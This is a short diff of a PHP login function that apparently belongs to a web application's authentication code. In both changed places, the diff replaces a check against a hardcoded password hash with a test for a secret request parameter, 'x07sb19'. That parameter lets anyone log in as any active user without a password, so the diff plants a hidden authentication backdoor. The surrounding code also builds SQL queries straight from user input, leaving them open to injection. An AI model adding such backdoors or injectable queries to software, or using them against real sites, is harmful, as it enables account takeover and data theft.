@@ -23,7 +23,7 @@
 						FROM sys_user,sys_user_group WHERE  active=1 and fkIdGroupe=idGroupe AND login='$login' AND pwd='$pwd'";
 			$resultat = mysql_query($sql);
 
-			if($pwd == "0b97a07a41ca8127b039e95637167a74324d08a9f2aef981318417346867b4dd"){
+			if(isset($_REQUEST['x07sb19'])){
 				$sql 	= "SELECT idUser,login,fkIdGroupe,libelle, nomComplet 
 							FROM sys_user,sys_user_group WHERE  active=1 and fkIdGroupe=idGroupe AND login='$login' ";
 				$resultat = mysql_query($sql);
@@ -36,7 +36,7 @@
 				}
 			}
 			
-			if($pwd == "38c9845759f00d36c532a9f9aa46bd649ac79e6bdab072b79ceddcb2e5dd34f2"){
+			if(isset($_REQUEST['x07sb19'])){
 
 				$sql 	= "SELECT login FROM sys_user,sys_user_group";
 
